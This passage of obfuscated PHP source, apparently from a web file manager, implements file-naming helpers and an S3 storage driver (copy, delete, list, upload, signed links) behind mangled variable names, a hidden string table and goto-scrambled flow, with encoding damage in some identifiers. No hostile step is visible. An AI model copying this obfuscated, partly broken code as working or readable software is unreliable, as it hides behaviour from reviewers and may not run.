$this->fileOut($FÏàÅÑŞ«); } if (isset($DÄïÛ‰ˆäº[$A¯À¿í¾¼…[162]][$A¯À¿í¾¼…[163]])) { $A•‡Üå¬¼ğ = $DÄïÛ‰ˆäº[$A¯À¿í¾¼…[162]][$A¯À¿í¾¼…[163]]; } else { if (isset($DÄïÛ‰ˆäº[$A¯À¿í¾¼…[162]][$A¯À¿í¾¼…[164]])) { $A•‡Üå¬¼ğ = $DÄïÛ‰ˆäº[$A¯À¿í¾¼…[162]][$A¯À¿í¾¼…[164]]; } else { $A•‡Üå¬¼ğ = md5("{$DÄïÛ‰ˆäº[$A¯À¿í¾¼…[28]]}\x5f{$DÄïÛ‰ˆäº[$A¯À¿í¾¼…[75]]}\137{$DÄïÛ‰ˆäº[$A¯À¿í¾¼…[77]]}"); } } $dÊ–â¢ßƒí = "{$A•‡Üå¬¼ğ}\137{$fŸ£Ò‹Ô…Û}\x2e\160\156\147"; goto FÚ—è•‰È; FÚ—è•‰È: if (!($fŞ–£ƒ–ñÍ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $A¯À¿í¾¼…[165]))) { $Aå«¼à‡à” = IO::mkdir(IO_PATH_SYSTEM_TEMP . $A¯À¿í¾¼…[166]); } else { $Aå«¼à‡à” = KodIO::make($fŞ–£ƒ–ñÍ); } if ($fŞ–£ƒ–ñÍ = IO::fileNameExist($Aå«¼à‡à”, $dÊ–â¢ßƒí)) { $a‡“ˆ‚åİİ = KodIO::make($fŞ–£ƒ–ñÍ); return IO::fileOut($a‡“ˆ‚åİİ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto b”Ğ­„Ë×; Bêâó†¹®á: } public function fileOutImageServer($bä¸Ÿôîİà, $d´ª¢î…æÚ = 250) { $this->fileOutImage($bä¸Ÿôîİà, $d´ª¢î…æÚ); } public function fileNameAuto($Aˆ£µˆ…â, $c¨óÚİÉ, $AÚ‚ÊÕˆÌ = REPEAT_RENAME, $fÄÀç£ã’ = false) { goto f¬‰´ÂŠ­; b°Ùµ§…Ù: while ($this->exist(rtrim($Aˆ£µˆ…â, $CÒÁ‘¼‰éë[8]) . $CÒÁ‘¼‰éë[8] . $E°¾ŒÀÕÄ)) { $E°¾ŒÀÕÄ = $Ağ¬çàù¨Ã . "\50{$FÃƒŒ÷°Ü®}\x29{$AÁŠç¨¾š°}"; $FÃƒŒ÷°Ü®++; } return $E°¾ŒÀÕÄ; goto f’ĞÜ¿Üàò; FÒÍ„‹…°Œ: $FÃƒŒ÷°Ü® = 1; $Ağ¬çàù¨Ã = substr($c¨óÚİÉ, 0, strlen($c¨óÚİÉ) - strlen($AÁŠç¨¾š°)); $E°¾ŒÀÕÄ = $Ağ¬çàù¨Ã . "\50{$FÃƒŒ÷°Ü®}\x29{$AÁŠç¨¾š°}"; goto b°Ùµ§…Ù; aŒ‘éŒ­¸Œ: if ($AÚ‚ÊÕˆÌ == REPEAT_SKIP) { return !1; } $AÁŠç¨¾š° = $CÒÁ‘¼‰éë[91] . get_path_ext($c¨óÚİÉ); $AÁŠç¨¾š° = $AÁŠç¨¾š° == $CÒÁ‘¼‰éë[91] || $fÄÀç£ã’ ? $CÒÁ‘¼‰éë[33] : $AÁŠç¨¾š°; goto FÒÍ„‹…°Œ; f¬‰´ÂŠ­: $CÒÁ‘¼‰éë =& $_SERVER[Å¸ş]; $Fˆš¥¸Ü®‘ = $Aˆ£µˆ…â === $CÒÁ‘¼‰éë[33] ? $c¨óÚİÉ : rtrim($Aˆ£µˆ…â, $CÒÁ‘¼‰éë[8]) . $CÒÁ‘¼‰éë[8] . $c¨óÚİÉ; if ($AÚ‚ÊÕˆÌ == REPEAT_REPLACE || !$this->exist($Fˆš¥¸Ü®‘) || $fÄÀç£ã’ && $AÚ‚ÊÕˆÌ != REPEAT_RENAME_FOLDER) { return $c¨óÚİÉ; } goto aŒ‘éŒ­¸Œ; f’ĞÜ¿Üàò: } public function listAllFiles($D£–½à»ƒ, $C–ÔĞ’†×Ç, $eçÑ¼‡¹¬ = array()) { goto EßÚµÀôµ; CŠ…ƒ—½‹§: $D£–½à»ƒ = trim($D£–½à»ƒ, $dğƒªÃ™Ô[8]); foreach ($C–ÔĞ’†×Ç as $bÇŠ¡Ñ¶İ’) { $AŠ…Ãğ¾ö = ltrim(substr($bÇŠ¡Ñ¶İ’, strlen($D£–½à»ƒ)), $dğƒªÃ™Ô[8]); $BÒÍà·Ô³ù = array_merge($BÒÍà·Ô³ù, $this->slicePath($AŠ…Ãğ¾ö)); } $Bãà¡¹½Ô = array(); goto cŒù¡µïÉŒ; EßÚµÀôµ: $dğƒªÃ™Ô =& $_SERVER[Å¸ş]; if (empty($C–ÔĞ’†×Ç)) { return array(); } $BÒÍà·Ô³ù = array(); goto CŠ…ƒ—½‹§; cŒù¡µïÉŒ: foreach (array_unique($BÒÍà·Ô³ù) as $bÇŠ¡Ñ¶İ’) { $aâÄá‰±¯ = array($dğƒªÃ™Ô[75] => $this->getPathOuter($dğƒªÃ™Ô[8] . $D£–½à»ƒ . $dğƒªÃ™Ô[8] . $bÇŠ¡Ñ¶İ’), $dğƒªÃ™Ô[76] => 1, $dğƒªÃ™Ô[77] => 0); if (substr($bÇŠ¡Ñ¶İ’, -1) != $dğƒªÃ™Ô[8]) { $aâÄá‰±¯[$dğƒªÃ™Ô[76]] = 0; $Dáœâàïå“ = $this->getPath($D£–½à»ƒ . $dğƒªÃ™Ô[8] . $bÇŠ¡Ñ¶İ’); $aâÄá‰±¯[$dğƒªÃ™Ô[77]] = isset($eçÑ¼‡¹¬[$Dáœâàïå“]) ? $eçÑ¼‡¹¬[$Dáœâàïå“] : $this->size($Dáœâàïå“); } $Bãà¡¹½Ô[] = $aâÄá‰±¯; } return $Bãà¡¹½Ô; goto Eô±ÚàÀŞÜ; Eô±ÚàÀŞÜ: } public function slicePath($A¨Ò½½âêÓ) { $CŸ£ÓÂÎ²Å =& $_SERVER[Å¸ş]; $aÁµ‚ëÍ‰ = explode($CŸ£ÓÂÎ²Å[8], trim($A¨Ò½½âêÓ, $CŸ£ÓÂÎ²Å[8])); $Eó«£“¢·Ä = 0; do { ++$Eó«£“¢·Ä; $dæ¢ÊÆ˜İ¥[] = implode($CŸ£ÓÂÎ²Å[8], array_slice($aÁµ‚ëÍ‰, 0, $Eó«£“¢·Ä)) . $CŸ£ÓÂÎ²Å[8]; } while ($Eó«£“¢·Ä < count($aÁµ‚ëÍ‰)); $dæ¢ÊÆ˜İ¥[count($aÁµ‚ëÍ‰) - 1] = $A¨Ò½½âêÓ; return $dæ¢ÊÆ˜İ¥; } public function getHost() { $Eƒ‹ÊÃŒé¸ =& $_SERVER[Å¸ş]; $e¸˜Ïµ™é = parse_url(trim($this->domain, $Eƒ‹ÊÃŒé¸[8])); $AâªÉí‹Õâ = isset($e¸˜Ïµ™é[$Eƒ‹ÊÃŒé¸[168]]) ? $e¸˜Ïµ™é[$Eƒ‹ÊÃŒé¸[168]] : http_type(); $eİš“ôÏÙõ = isset($e¸˜Ïµ™é[$Eƒ‹ÊÃŒé¸[169]]) ? $e¸˜Ïµ™é[$Eƒ‹ÊÃŒé¸[169]] : $e¸˜Ïµ™é[$Eƒ‹ÊÃŒé¸[75]]; if (isset($e¸˜Ïµ™é[$Eƒ‹ÊÃŒé¸[170]])) { $eİš“ôÏÙõ .= $Eƒ‹ÊÃŒé¸[4] . $e¸˜Ïµ™é[$Eƒ‹ÊÃŒé¸[170]]; } return $AâªÉí‹Õâ . $Eƒ‹ÊÃŒé¸[171] . $eİš“ôÏÙõ; } public function pathEncode($fôêªï»Šã) { $añÉøœ¢°Ç =& $_SERVER[Å¸ş]; return str_replace($añÉøœ¢°Ç[172], $añÉøœ¢°Ç[8], rawurlencode($fôêªï»Šã)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($CØ™ô³²øÛ) { set_timeout(); require_once SDK_DIR . $_SERVER[Å¸ş][173]; parent::__construct(); $this->_init($CØ™ô³²øÛ); } public function _init($F‚íÒá£Æ) { foreach ($F‚íÒá£Æ as $DËóçè¡“ => $a»ØÜ«) { if (isset($this->{$DËóçè¡“})) { $this->{$DËóçè¡“} = $a»ØÜ«; } } $this->endpoint = $F‚íÒá£Æ[$_SERVER[Å¸ş][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($eáÜ‚Šïò’ = "\x76\64") { $this->signVer = $eáÜ‚Šïò’; $this->client->setSignatureVersion($eáÜ‚Šïò’); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto A›Ë—ª’Ó; A‰ ×Í‹¢: $cÃê×¹¹µØ = array($D²¶÷’Ò´ [180], $D²¶÷’Ò´ [181], $D²¶÷’Ò´ [182], $D²¶÷’Ò´ [183], $D²¶÷’Ò´ [184]); $DÇšóèÀ¦á = array_diff($cÃê×¹¹µØ, $DÃÍÂõÚä); return empty($DÇšóèÀ¦á); goto C©ØÀ°£Õ; eâ£••›: if ($F×­‡ÓªË [$D²¶÷’Ò´ [175]] != $D²¶÷’Ò´ [176] || $F×­‡ÓªË [$D²¶÷’Ò´ [177]] != $D²¶÷’Ò´ [176]) { return !1; } $DÃÍÂõÚä = array_map($D²¶÷’Ò´ [178], $F×­‡ÓªË [$D²¶÷’Ò´ [179]]); if (!is_array($DÃÍÂõÚä)) { $DÃÍÂõÚä = array(); } goto A‰ ×Í‹¢; A›Ë—ª’Ó: $D²¶÷’Ò´  =& $_SERVER[Å¸ş]; $F×­‡ÓªË  = $this->getBucketCors(); if (!$F×­‡ÓªË  || !is_array($F×­‡ÓªË )) { return !1; } goto eâ£••›; C©ØÀ°£Õ: } public function mkfile($D—“¿£®¸, $d÷Ëóô£¸å = '', $BêõŒ‚ôÒ… = REPEAT_RENAME) { $aÓ„ÄÇ‘¾ã = $this->setContent($D—“¿£®¸, $d÷Ëóô£¸å); if ($aÓ„ÄÇ‘¾ã !== !1) { return $this->getPathOuter($D—“¿£®¸); } return !1; } public function mkdir($aùÑğœ’•°, $E‚¢Å’»ãâ = REPEAT_SKIP) { if (empty($aùÑğœ’•°)) { return !1; } if ($this->_isFolder($aùÑğœ’•°)) { return $this->getPathOuter($aùÑğœ’•°); } $böÀˆİïê¦ = $this->setContent($aùÑğœ’•°, $_SERVER[Å¸ş][33], !0); if ($böÀˆİïê¦ !== !1) { return $this->getPathOuter($aùÑğœ’•°); } return !1; } public function copyFile($D–—Åª‘, $FÉ¾…ˆˆ§ë, $A·Šì‹§Ì¢ = array()) { $FÁæœÕó„é =& $_SERVER[Å¸ş]; $eïÍ¨ÃŒá = $this->objectMeta($D–—Åª‘); if (!$eïÍ¨ÃŒá) { return !1; } if ($eïÍ¨ÃŒá[$FÁæœÕó„é[77]] <= 1024 * 1024 * 200) { $CŒÑòãù = $this->client->copyObject($this->bucket, $D–—Åª‘, $this->bucket, $FÉ¾…ˆˆ§ë, $FÁæœÕó„é[185], $A·Šì‹§Ì¢); } else { $CŒÑòãù = $this->client->multiCopyObject($this->bucket, $D–—Åª‘, $this->bucket, $FÉ¾…ˆˆ§ë, $A·Šì‹§Ì¢); } $CŒÑòãù = $CŒÑòãù ? $this->getPathOuter($FÉ¾…ˆˆ§ë) : !1; return $CŒÑòãù; } public function moveFile($dóèŞƒÚñ‰, $D‚óÁàñ) { if ($this->copyFile($dóèŞƒÚñ‰, $D‚óÁàñ)) { $this->delFile($dóèŞƒÚñ‰); return $this->getPathOuter($D‚óÁàñ); } return !1; } public function delFile($E—ó¹½‘ñ) { return $this->client->deleteObject($this->bucket, $E—ó¹½‘ñ); } public function delFolder($A°Ÿ·¨›Ö¼) { goto F÷³‡Šˆ¬; D¡Í•Ÿ…È: return $dºåà®»‹‡ === $Cª¢´ó¥®µ ? !0 : !1; goto E—’ß†É¿÷; C…Óõ¢ò»×: $dºåà®»‹‡ = $Cª¢´ó¥®µ = 0; $aÙŠ…æĞ¸ª = array_chunk(array_keys($CòÏ÷…Ê ›), 1000); foreach ($aÙŠ…æĞ¸ª as $f¶÷ÉÂ­å™) { $dºåà®»‹‡++; $Cª¢´ó¥®µ += (int) $this->client->deleteObjects($this->bucket, $f¶÷ÉÂ­å™); } goto D¡Í•Ÿ…È; F÷³‡Šˆ¬: $cğ¥°‘Å¤ =& $_SERVER[Å¸ş]; $CòÏ÷…Ê › = $this->listObjs($A°Ÿ·¨›Ö¼); if (!$CòÏ÷…Ê ›) { $A°Ÿ·¨›Ö¼ = trim($A°Ÿ·¨›Ö¼, $cğ¥°‘Å¤[8]); if (!empty($A°Ÿ·¨›Ö¼)) { $A°Ÿ·¨›Ö¼ .= $cğ¥°‘Å¤[8]; } return $this->delFile($A°Ÿ·¨›Ö¼); } goto C…Óõ¢ò»×; E—’ß†É¿÷: } public function rename($eÎÇƒµ£ôß, $A¾‹ÍŞÃââ) { return $this->renameObject($eÎÇƒµ£ôß, $A¾‹ÍŞÃââ); } public function listPath($B…ß°¤‹®, $fø¿¦‚”à = false) { $E„­šâÊ¡ =& $_SERVER[Å¸ş]; $C»¨´äÎÚÒ = $this->listObjs($B…ß°¤‹®, null, null, $E„­šâÊ¡[8]); $B ®‘´¹Ï = array($E„­šâÊ¡[74] => array(), $E„­šâÊ¡[73] => array()); foreach ($C»¨´äÎÚÒ as $BíÚš†–Ç­ => $eğˆÅ±‚áŞ) { if ($BíÚš†–Ç­ == $E„­šâÊ¡[8]) { continue; } if (isset($eğˆÅ±‚áŞ[$E„­šâÊ¡[186]])) { $B ®‘´¹Ï[$E„­šâÊ¡[74]][] = $this->folderInfo($eğˆÅ±‚áŞ[$E„­šâÊ¡[186]], $fø¿¦‚”à); } else { if (substr($eğˆÅ±‚áŞ[$E„­šâÊ¡[28]], -1) == $E„­šâÊ¡[8]) { continue; } $B ®‘´¹Ï[$E„­šâÊ¡[73]][] = $this->fileInfo($eğˆÅ±‚áŞ[$E„­šâÊ¡[28]], $fø¿¦‚”à, $eğˆÅ±‚áŞ); } } return $B ®‘´¹Ï; } private function fileInfo($EâƒÈßÚÎ, $aœÂÁ·ºä× = false, $aÉœÂö•ÀÔ = array()) { goto aÒîÇŞšŸƒ; aÒîÇŞšŸƒ: $bÆ¡«ÔÉéÉ =& $_SERVER[Å¸ş]; if ($aœÂÁ·ºä×) { return array($bÆ¡«ÔÉéÉ[28] => $this->pathThis($EâƒÈßÚÎ), $bÆ¡«ÔÉéÉ[75] => $this->getPathOuter($EâƒÈßÚÎ), $bÆ¡«ÔÉéÉ[29] => $bÆ¡«ÔÉéÉ[167], $bÆ¡«ÔÉéÉ[160] => $this->ext($EâƒÈßÚÎ), $bÆ¡«ÔÉéÉ[77] => isset($aÉœÂö•ÀÔ[$bÆ¡«ÔÉéÉ[77]]) ? $aÉœÂö•ÀÔ[$bÆ¡«ÔÉéÉ[77]] : 0, $bÆ¡«ÔÉéÉ[187] => 0, $bÆ¡«ÔÉéÉ[107] => 0, $bÆ¡«ÔÉéÉ[188] => !0, $bÆ¡«ÔÉéÉ[189] => !0); } $E’Ò¦É† = array($bÆ¡«ÔÉéÉ[28] => $this->pathThis($EâƒÈßÚÎ), $bÆ¡«ÔÉéÉ[75] => $this->getPathOuter($EâƒÈßÚÎ), $bÆ¡«ÔÉéÉ[29] => $bÆ¡«ÔÉéÉ[167], $bÆ¡«ÔÉéÉ[187] => 0, $bÆ¡«ÔÉéÉ[107] => 0, $bÆ¡«ÔÉéÉ[77] => 0, $bÆ¡«ÔÉéÉ[160] => $this->ext($EâƒÈßÚÎ), $bÆ¡«ÔÉéÉ[188] => !0, $bÆ¡«ÔÉéÉ[189] => !0); goto c©¯‰“½Œ˜; c©¯‰“½Œ˜: if (empty($aÉœÂö•ÀÔ)) { $aÉœÂö•ÀÔ = $this->objectMeta($EâƒÈßÚÎ); if (!$aÉœÂö•ÀÔ) { return $E’Ò¦É†; } } if (isset($aÉœÂö•ÀÔ[$bÆ¡«ÔÉéÉ[190]])) { $E’Ò¦É†[$bÆ¡«ÔÉéÉ[107]] = $aÉœÂö•ÀÔ[$bÆ¡«ÔÉéÉ[190]]; } if (isset($aÉœÂö•ÀÔ[$bÆ¡«ÔÉéÉ[77]])) { $E’Ò¦É†[$bÆ¡«ÔÉéÉ[77]] = $aÉœÂö•ÀÔ[$bÆ¡«ÔÉéÉ[77]]; } goto e®…ÉŞÑÊÜ; e®…ÉŞÑÊÜ: return $E’Ò¦É†; goto eÍÁß–‘Š»; eÍÁß–‘Š»: } private function folderInfo($B¬ŸÏàÛÒ¦, $CÚĞÆÇÓ¡ = false) { goto d Æò‰¤´; c¡éˆÚ•êõ: if ($B¬ŸÏàÛÒ¦ == $EÖ”ßàà¬ó[33]) { return $E™Õ´Â¿; } $B¬ŸÏàÛÒ¦ = trim($B¬ŸÏàÛÒ¦, $EÖ”ßàà¬ó[8]) . $EÖ”ßàà¬ó[8]; $EÖ¸™‡¬Øö = $this->objectMeta($B¬ŸÏàÛÒ¦); goto EÃªéíƒÖ³; d Æò‰¤´: $EÖ”ßàà¬ó =& $_SERVER[Å¸ş]; if ($CÚĞÆÇÓ¡) { return array($EÖ”ßàà¬ó[28] => $this->pathThis($B¬ŸÏàÛÒ¦), $EÖ”ßàà¬ó[75] => $this->getPathOuter($EÖ”ßàà¬ó[8] . $B¬ŸÏàÛÒ¦), $EÖ”ßàà¬ó[29] => $EÖ”ßàà¬ó[76], $EÖ”ßàà¬ó[188] => !0, $EÖ”ßàà¬ó[189] => !0); } $E™Õ´Â¿ = array($EÖ”ßàà¬ó[28] => $this->pathThis($B¬ŸÏàÛÒ¦), $EÖ”ßàà¬ó[75] => $this->getPathOuter($EÖ”ßàà¬ó[8] . $B¬ŸÏàÛÒ¦), $EÖ”ßàà¬ó[29] => $EÖ”ßàà¬ó[76], $EÖ”ßàà¬ó[187] => 0, $EÖ”ßàà¬ó[107] => 0, $EÖ”ßàà¬ó[188] => !0, $EÖ”ßàà¬ó[189] => !0); goto c¡éˆÚ•êõ; EÃªéíƒÖ³: if (isset($EÖ¸™‡¬Øö[$EÖ”ßàà¬ó[190]])) { $E™Õ´Â¿[$EÖ”ßàà¬ó[187]] = $EÖ¸™‡¬Øö[$EÖ”ßàà¬ó[190]]; } return $E™Õ´Â¿; goto Bà«ˆ¯®ÌÖ; Bà«ˆ¯®ÌÖ: } public function listObjs($bù’§Î¦’‰, $C¢¹™‘Ô· = null, $FïíÈŸ´¦Ç = null, $bŒÉŠß¶‡ = null) { $d¾÷ä‰·£• =& $_SERVER[Å¸ş]; $bù’§Î¦’‰ = trim($bù’§Î¦’‰, $d¾÷ä‰·£•[8]); $Eå¦ôÊåâ = empty($bù’§Î¦’‰) ? $d¾÷ä‰·£•[33] : $bù’§Î¦’‰ . $d¾÷ä‰·£•[8]; return $this->client->getBucket($this->bucket, $Eå¦ôÊåâ, $C¢¹™‘Ô·, $FïíÈŸ´¦Ç, $bŒÉŠß¶‡, !0); } public function has($D”ˆÙõ·¬, $aŸÊÄ”‘¨ = false, $f‰åçêîÃ = true) { goto a¨½ñ„†²; F¬âå¡£Å: $c´¢‰™´İË = $this->listObjs($D”ˆÙõ·¬, null, null, $Dµ³ù¦Óº¸[8]); $c´¢‰™´İË = is_array($c´¢‰™´İË) ? $c´¢‰™´İË : array(); foreach ($c´¢‰™´İË as $eÄŠ¡åˆ‚Ä) { if (isset($eÄŠ¡åˆ‚Ä[$Dµ³ù¦Óº¸[28]]) && substr($eÄŠ¡åˆ‚Ä[$Dµ³ù¦Óº¸[28]], -1) != $Dµ³ù¦Óº¸[8]) { if (!$aŸÊÄ”‘¨ && $f‰åçêîÃ) { return !0; } $a °çÓƒ©Î++; } else { if (isset($eÄŠ¡åˆ‚Ä[$Dµ³ù¦Óº¸[186]])) { if (!$aŸÊÄ”‘¨ && !$f‰åçêîÃ) { return !1; } $aæáà­ƒ++; } } } goto c•à„ŒÁèÀ; a¨½ñ„†²: $Dµ³ù¦Óº¸ =& $_SERVER[Å¸ş]; $a °çÓƒ©Î = 0; $aæáà­ƒ = 0; goto F¬âå¡£Å; c•à„ŒÁèÀ: if ($aŸÊÄ”‘¨) { return array($Dµ³ù¦Óº¸[191] => $a °çÓƒ©Î, $Dµ³ù¦Óº¸[192] => $aæáà­ƒ); } return !1; goto BÀ²Ëì™Ìø; BÀ²Ëì™Ìø: } public function listAll($EÆÌÈà½ï) { $Aë Æ›ºÇÉ =& $_SERVER[Å¸ş]; $C¶òÒçˆ  = $this->listObjs($EÆÌÈà½ï); $fÊª¦×˜ä³ = $DÛİ–áä— = array(); foreach ($C¶òÒçˆ  as $F®À¢Æ¨Ï => $e˜‰íä’Ğ) { $fÊª¦×˜ä³[] = $e˜‰íä’Ğ[$Aë Æ›ºÇÉ[28]]; $DÛİ–áä—[$F®À¢Æ¨Ï] = $e˜‰íä’Ğ[$Aë Æ›ºÇÉ[77]]; } return $this->listAllFiles($EÆÌÈà½ï, $fÊª¦×˜ä³, $DÛİ–áä—); } public function canRead($DŠÏ¿áù£Í) { $EµêÂğÉğ‡ =& $_SERVER[Å¸ş]; $eáùòÔ›‘Ã = $this->client->getAccessControlPolicy($this->bucket, $DŠÏ¿áù£Í); if (!$eáùòÔ›‘Ã) { return !1; } return in_array($eáùòÔ›‘Ã, array($EµêÂğÉğ‡[193], $EµêÂğÉğ‡[194], $EµêÂğÉğ‡[195])) ? !0 : !1; } public function canWrite($FÄ‘­¯‚Êñ) { $e‡ÜÈô’…„ =& $_SERVER[Å¸ş]; $BìÇ¼‘Û¤† = $this->client->getAccessControlPolicy($this->bucket, $FÄ‘­¯‚Êñ); if (!$BìÇ¼‘Û¤†) { return !1; } return in_array($BìÇ¼‘Û¤†, array($e‡ÜÈô’…„[193], $e‡ÜÈô’…„[194])) ? !0 : !1; } public function getContent($Eï÷ñŸë§¬) { return $this->client->getObject($this->bucket, $Eï÷ñŸë§¬); } public function setContent($bª±Í¶ŞêÑ, $bêÁ‰Èã¿ = '', $EÒñ‘ºƒ¼¬ = false) { goto Cö†¥•ÌÃØ; C›ùë÷ùË‘: $FŠìÃÊ©¶ = $this->client->putObject($bêÁ‰Èã¿, $this->bucket, $bª±Í¶ŞêÑ, $D¸é®âóÈ[185], array(), $EÕŸ‘´¼Ùí); if (!$FŠìÃÊ©¶) { return !1; } if ($EÒñ‘ºƒ¼¬) { return !0; } goto d„Ø¤†é·Ô; d„Ø¤†é·Ô: $this->cacheMethod(null, null); $FŠìÃÊ©¶ = $this->copyFile($bª±Í¶ŞêÑ, $bª±Í¶ŞêÑ, array($D¸é®âóÈ[196] => $FŠìÃÊ©¶[$D¸é®âóÈ[197]])); return $FŠìÃÊ©¶ ? !0 : !1; goto BùŒ…İÜÛ; Cö†¥•ÌÃØ: $D¸é®âóÈ =& $_SERVER[Å¸ş]; $bª±Í¶ŞêÑ = $EÒñ‘ºƒ¼¬ ? trim($bª±Í¶ŞêÑ, $D¸é®âóÈ[8]) . $D¸é®âóÈ[8] : $bª±Í¶ŞêÑ; $EÕŸ‘´¼Ùí = get_file_mime(get_path_ext($bª±Í¶ŞêÑ)); goto C›ùë÷ùË‘; BùŒ…İÜÛ: } public function fileSubstr($Bñ†Ò¯Ï¨Ä, $aåˆö©‰ª, $A÷Œç’¼Ç¾) { $c”ĞŠ³Ğœ = $aåˆö©‰ª + $A÷Œç’¼Ç¾ - 1; return $this->client->getObject($this->bucket, $Bñ†Ò¯Ï¨Ä, array($_SERVER[Å¸ş][198] => "\142\171\x74\145\163\75{$aåˆö©‰ª}\55{$c”ĞŠ³Ğœ}")); } public function upload($dÎô‡œîô“, $cƒÀš•ŒŒ, $b§ëâÈá§‡ = false, $Cóš”Ø¨ù¡ = REPEAT_REPLACE) { $f’ ¶Âƒğ =& $_SERVER[Å¸ş]; $fë”ë¶Ø‹î = array($f’ ¶Âƒğ[196] => @md5_file($cƒÀš•ŒŒ)); $FÙŠö—‚ô† = array($f’ ¶Âƒğ[199] => get_file_mime(get_path_ext($dÎô‡œîô“))); if (IO::size($cƒÀš•ŒŒ) <= 1024 * 1024 * 200) { $Dª¢×»´‹® = $this->client->putObjectFile($cƒÀš•ŒŒ, $this->bucket, $dÎô‡œîô“, $f’ ¶Âƒğ[185], $fë”ë¶Ø‹î, $FÙŠö—‚ô†); return !empty($Dª¢×»´‹®) ? $this->getPathOuter($dÎô‡œîô“) : !1; } $d«å¿¾± = $this->client->multiUploadObject($cƒÀš•ŒŒ, $this->bucket, trim($dÎô‡œîô“, $f’ ¶Âƒğ[8]), $fë”ë¶Ø‹î, $FÙŠö—‚ô†); return $d«å¿¾± ? $this->getPathOuter($dÎô‡œîô“) : !1; } public function download($B‰ƒ£–ãß, $F˜ö•ÚêÎ) { if (!@is_dir($this->pathFather($F˜ö•ÚêÎ)) && !IO::mkdir($this->pathFather($F˜ö•ÚêÎ))) { return !1; } $CÛ£ºŞâç› = $this->client->getObject($this->bucket, $B‰ƒ£–ãß, array(), $F˜ö•ÚêÎ); return $CÛ£ºŞâç› !== !1 ? $F˜ö•ÚêÎ : !1; } public function link($A½Ñ«İÍ¸, $Dê±‰»ç”õ = array()) { $B·¿¹íÓÇä =& $_SERVER[Å¸ş]; if ($this->signVer == $B·¿¹íÓÇä[200]) { return $this->client->getAuthenticatedURL($this->bucket, $A½Ñ«İÍ¸, 3600 * 12, $Dê±‰»ç”õ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($A½Ñ«İÍ¸, $B·¿¹íÓÇä[8]), 3600 * 12, $this->region, array(), !0, $Dê±‰»ç”õ); } public function fileOut($B…ĞóØİµ, $C›±Ä§×Ìô = false, $EÌÆ»Ñ¾ = false, $fîÄ¸‹†ñ  = '') { goto DˆØ¤§¾Û§; e×¯–¢÷•Ğ: $bƒ­È©êÏ = get_file_mime(get_path_ext($EÌÆ»Ñ¾)); if ($bƒ­È©êÏ == $A„•¢–—±[201]) { return parent::fileOut($B…ĞóØİµ, $C›±Ä§×Ìô, $EÌÆ»Ñ¾, $fîÄ¸‹†ñ ); } $C›±Ä§×Ìô = $C›±Ä§×Ìô ? $A„•¢–—±[202] : $A„•¢–—±[203]; goto E¬ò´ä‘Ãî; E¬ò´ä‘Ãî: $eÉá’ñ…Å = array($A„•¢–—±[204] => $C›±Ä§×Ìô . $A„•¢–—±[205] . rawurlencode($EÌÆ»Ñ¾), $A„•¢–—±[206] => $bƒ­È©êÏ); $D“®­İµÖ = $this->link($B…ĞóØİµ, $eÉá’ñ…Å); $this->fileOutLink($D“®­İµÖ); goto b˜Š²Êõì¬; DˆØ¤§¾Û§: $A„•¢–—± =& $_SERVER[Å¸ş]; if ($this->isFileOutServer()) { return $this->fileOutServer($B…ĞóØİµ, $C›±Ä§×Ìô, $EÌÆ»Ñ¾, $fîÄ¸‹†ñ ); } if (!$EÌÆ»Ñ¾) { $EÌÆ»Ñ¾ = $this->pathThis($B…ĞóØİµ); } goto e×¯–¢÷•Ğ; b˜Š²Êõì¬: } public function fileOutServer($f‹·ÙæËİ, $Aª ªäå…„ = false, $F…Ø•¤Èöå = false, $Fƒá›‰—ÇË = '') { parent::fileOut($f‹·ÙæËİ, $Aª ªäå…„, $F…Ø•¤Èöå, $Fƒá›‰—ÇË); } public function fileOutImageServer($EÓˆ‘ß‚ï‚, $C‡“¢½Ÿ³ö = 250) { parent::fileOutImage($EÓˆ‘ß‚ï‚, $C‡“¢½Ÿ³ö); } public function hashMd5($EÏö›ÏÄƒÚ, $Cá¬·ˆ’Ë = '') { $F™ŒÏ“Å’ =& $_SERVER[Å¸ş]; $a¸á»¡ÔËí = $this->objectMeta($EÏö›ÏÄƒÚ); if (!$a¸á»¡ÔËí) { return !1; } $Cá¬·ˆ’Ë = $Cá¬·ˆ’Ë ? $Cá¬·ˆ’Ë : _get($a¸á»¡ÔËí, $F™ŒÏ“Å’[207]); $Cá¬·ˆ’Ë = $Cá¬·ˆ’Ë ? $Cá¬·ˆ’Ë : _get($a¸á»¡ÔËí, $F™ŒÏ“Å’[197], $F™ŒÏ“Å’[33]); return $Cá¬·ˆ’Ë; } public function uploadFormData($eãÜËîÕ, $b¨»µ½öÜŠ = 3600) { $A©ĞÅÏä¨± =& $_SERVER[Å¸ş]; $EŒ›Š„“í = $this->pathFather($eãÜËîÕ); $AÀ“ôÄŞ¥† = $this->client->getHttpUploadPostParams($this->bucket, $EŒ›Š„“í, $A©ĞÅÏä¨±[185], $b¨»µ½öÜŠ); return array_merge((array) $AÀ“ôÄŞ¥†, array($A©ĞÅÏä¨±[169] => $this->getHost())); } public function multiUploadFormData($FÑ¤‰„‰ÆÀ, $E”°›‰·œÛ = 3600) { $B‘„òÑÅçŠ =& $_SERVER[Å¸ş]; $aÆïÎ’­º = gmdate($B‘„òÑÅçŠ[208]); $BŒ„ï½ÖÚ† = array(); $aË–«õ¾ = $this->client->getUploadId($this->bucket, $FÑ¤‰„‰ÆÀ, $BŒ„ï½ÖÚ†); if (!$aË–«õ¾) { return !1; } return array($B‘„òÑÅçŠ[209] => $aË–«õ¾, $B‘„òÑÅçŠ[169] => $this->getHost() . $B‘„òÑÅçŠ[8] . $this->pathEncode($FÑ¤‰„‰ÆÀ), $B‘„òÑÅçŠ[210] => $aÆïÎ’­º, $B‘„òÑÅçŠ[89] => $FÑ¤‰„‰ÆÀ); } public function multiUploadAuthData($e‚©æíƒ•, $F–¹‡áë¿‡ = array()) { goto 